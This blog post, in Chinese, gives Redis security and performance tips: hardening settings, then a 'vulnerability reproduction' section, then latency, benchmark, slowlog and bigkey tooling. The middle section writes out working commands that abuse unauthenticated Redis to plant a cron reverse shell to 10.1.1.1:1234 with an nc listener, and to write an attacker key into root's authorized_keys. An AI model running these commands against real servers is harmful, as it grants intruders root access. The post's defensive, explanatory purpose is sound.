---
title: "redis日常使用的一些建议"
date: 2022-03-05T00:29:47+08:00
tag : [ "redis", "safe" ]
description: "redis日常使用的一些建议"
categories: [ "redis", "safe" ]
toc: true
---

## 前言
最近处理了几起redis不安全的阿里云服务器，总结下一些建议  

## 1、安全建议
### 1.1、设置bind
默认bind 0.0.0.0是默认值，相当于不设防
```bash
bind 0.0.0.0
建议修改成链接端的IP，比如
bind 192.168.100.101
```

### 1.2、设置auth
默认是不设置密码，相当于不需要密码和鉴权就可以访问
```bash
requirepass foobared
建议开启密码访问，并且不能设置弱口令密码，比如
requirepass Admin9527#&@ekd452
```

### 1.3、设置port
默认是6937，容易被扫描到
```bash
port 6379
建议修改默认端口，比如
port 36379
```

### 1.4、设置config
检查config这2个文件设置的值是否自己设置的值
```bash
192.168.210.142:36379> config get dbfilename
1) "dbfilename"
2) "dump.rdb"
192.168.210.142:36379> config get dir
1) "dir"
2) "./"
```

### 1.5、【可选】设置rename-command
把危险命令重命名，增加一些难度，作为可选方式
```bash
rename-command KEYS "kk"
rename-command FLUSHALL "ff"
rename-command SHUTDOWN "ss"
rename-command CONFIG "cc"
```

## 2、漏洞复现
### 2.1 利用crontab反弹shell
登录redis设置
```bash
#redis-cli -h 10.1.1.2 -a 123456 //如果没有密码，不用添加-a参数
10.1.1.2:6379> config set dir /var/spool/cron
OK
10.1.1.2:6379> config set dbfilename root
OK
10.1.1.2:6379> set xxoo "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/10.1.1.1/1234 0>&1\n\n"
10.1.1.2:6379>save
OK
```
不登录redis设置
```bash
#echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/10.1.1.1/1234 0>&1\n\n"|redis-cli -h 192.168.118.129 -a 123456 -x set 1
#redis-cli -h 192.168.118.129 -a 123456 config set dir /var/spool/cron/
#redis-cli -h 192.168.118.129 -a 123456 config set dbfilename root
#redis-cli -h 192.168.118.129 -a 123456 save
```
在 10.1.1.1上执行
```bash
#nc -l -p 1234 -vv //监听1234端口
```

### 2.2 利用写authorized_keys实现无密码登录
```bash
127.0.0.1:6379>flushall
OK
127.0.0.1:6379>config set dir /root/.ssh/
OK
127.0.0.1:6379>config set dbfilename authorized_keys
OK
127.0.0.1:6379>set xxoo "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDxna91qSLsy9sbYSZNYMpe0root@localhost.localdomain\n\n"
OK
127.0.0.1:6379>save
OK
```
然后ssh方式就可以登录这台服务器了

## 3、性能分析
### 3.1 测试最大响应延迟
```bash
$ redis-cli -h 127.0.0.1 -p 6379 --intrinsic-latency 60
Max latency so far: 1 microseconds.
Max latency so far: 15 microseconds.
Max latency so far: 17 microseconds.
Max latency so far: 18 microseconds.
Max latency so far: 31 microseconds.
Max latency so far: 32 microseconds.
Max latency so far: 59 microseconds.
Max latency so far: 72 microseconds.

1428669267 total runs (avg latency: 0.0420 microseconds / 42.00 nanoseconds per run).
Worst run took 1429x longer than the average latency.
```
从输出结果可以看到，这60秒内的最大响应延迟为72微秒（0.072毫秒）。

### 3.2 查看一段时间内最小、最大、平均访问延迟
```bash
$ redis-cli -h 127.0.0.1 -p 6379 --latency-history -i 1
min: 0, max: 1, avg: 0.13 (100 samples) -- 1.01 seconds range
min: 0, max: 1, avg: 0.12 (99 samples) -- 1.01 seconds range
min: 0, max: 1, avg: 0.13 (99 samples) -- 1.01 seconds range
min: 0, max: 1, avg: 0.10 (99 samples) -- 1.01 seconds range
min: 0, max: 1, avg: 0.13 (98 samples) -- 1.00 seconds range
min: 0, max: 1, avg: 0.08 (99 samples) -- 1.01 seconds range
...
```
从输出结果看，每间隔1秒，采样Redis的平均操作耗时，其结果分布在0.08 ~ 0.13毫秒之间。

### 3.3 性能测试
redis性能测试命令
```bash
redis-benchmark -h 127.0.0.1 -p 6379 -c 50 -n 10000 -q
PING_INLINE: 63291.14 requests per second
PING_BULK: 62500.00 requests per second
SET: 49261.09 requests per second
GET: 47619.05 requests per second
INCR: 42194.09 requests per second
LPUSH: 61349.69 requests per second
RPUSH: 56818.18 requests per second
LPOP: 47619.05 requests per second
RPOP: 45045.04 requests per second
SADD: 46296.30 requests per second
SPOP: 59523.81 requests per second
LPUSH (needed to benchmark LRANGE): 56818.18 requests per second
LRANGE_100 (first 100 elements): 32362.46 requests per second
LRANGE_300 (first 300 elements): 13315.58 requests per second
LRANGE_500 (first 450 elements): 10438.41 requests per second
LRANGE_600 (first 600 elements): 8591.07 requests per second
MSET (10 keys): 55248.62 requests per second
```
说明：50个连接，10000次请求对应的性能

参数：

参数|描述|默认值
-|-|-
-h|\<hostname\>，服务url|127.0.0.1
-p|\<port\>， 服务端口|6379
-s|\<socket\>，服务 socket，覆盖host和port|-
-a|\<password\>，密码|-
-c|\<clients\>，并发连接数|50
-n|\<requests\>，指定请求数|10000
-d|\<size\>，椅子姐的姓氏设定SET/GET值的数据大小|3
--dbnum|\<db\>，数据库分片|0
-k|\<boolean\>，1=keep alive, 0=reconnect|1
-r|\<keyspacelen\>，SET/GET/INCR 使用随机 key，SADD 使用随机值
-P|通过管道传输\<numreq\>请求|-
-q|强制退出 redis，仅显示 query/sec 值|-
--csv|以 CSV 格式输出|-
-l|生成循环，用久执行测试|-
-t|\<tests\>，仅运行以都好分割的测试命令列表|-
-I|Idle 模式，仅打开 N 个 idle连接并等待|-


### 3.4 查看慢日志
查看Redis慢日志之前，你需要设置慢日志的阈值。例如，设置慢日志的阈值为5毫秒，并且保留最近500条慢日志记录：
```bash
# 命令执行耗时超过 5 毫秒，记录慢日志
CONFIG SET slowlog-log-slower-than 5000
# 只保留最近 500 条慢日志
CONFIG SET slowlog-max-len 500
```
设置完成之后，所有执行的命令如果操作耗时超过了5毫秒，都会被Redis记录下来。

此时，你可以执行以下命令，就可以查询到最近记录的慢日志：
```bash
127.0.0.1:6379> SLOWLOG get 5
1) 1) (integer) 32693       # 慢日志ID
   2) (integer) 1593763337  # 执行时间戳
   3) (integer) 5299        # 执行耗时(微秒)
   4) 1) "LRANGE"           # 具体执行的命令和参数
      2) "user_list:2000"
      3) "0"
      4) "-1"
2) 1) (integer) 32692
   2) (integer) 1593763337
   3) (integer) 5044
   4) 1) "GET"
      2) "user_info:1000"
...
```
通过查看慢日志，我们就可以知道在什么时间点，执行了哪些命令比较耗时。

### 3.5 查看bigkey
Redis提供了扫描bigkey的命令，执行以下命令就可以扫描出，一个实例中bigkey的分布情况，输出结果是以类型维度展示的：
```bash
$ redis-cli -h 127.0.0.1 -p 6379 --bigkeys -i 0.01

...
-------- summary -------

Sampled 829675 keys in the keyspace!
Total key length in bytes is 10059825 (avg len 12.13)

Biggest string found 'key:291880' has 10 bytes
Biggest   list found 'mylist:004' has 40 items
Biggest    set found 'myset:2386' has 38 members
Biggest   hash found 'myhash:3574' has 37 fields
Biggest   zset found 'myzset:2704' has 42 members

36313 strings with 363130 bytes (04.38% of keys, avg size 10.00)
787393 lists with 896540 items (94.90% of keys, avg size 1.14)
1994 sets with 40052 members (00.24% of keys, avg size 20.09)
1990 hashs with 39632 fields (00.24% of keys, avg size 19.92)
1985 zsets with 39750 members (00.24% of keys, avg size 20.03)
```
从输出结果我们可以很清晰地看到，每种数据类型所占用的最大内存 / 拥有最多元素的key是哪一个，以及每种数据类型在整个实例中的占比和平均大小 / 元素数量。